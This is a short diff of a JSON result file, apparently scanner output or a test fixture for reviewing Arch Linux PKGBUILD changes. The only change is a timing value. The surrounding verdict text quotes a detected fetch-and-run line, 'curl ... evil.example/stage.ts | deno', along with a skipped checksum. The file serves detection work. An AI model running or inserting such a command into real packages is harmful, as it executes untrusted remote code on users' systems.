@@ -381,6 +381,6 @@
       "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: checksum set to SKIP [H001]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [H016]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno [R010]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 763
+    "wall_clock_ms": 1011
   }
 }
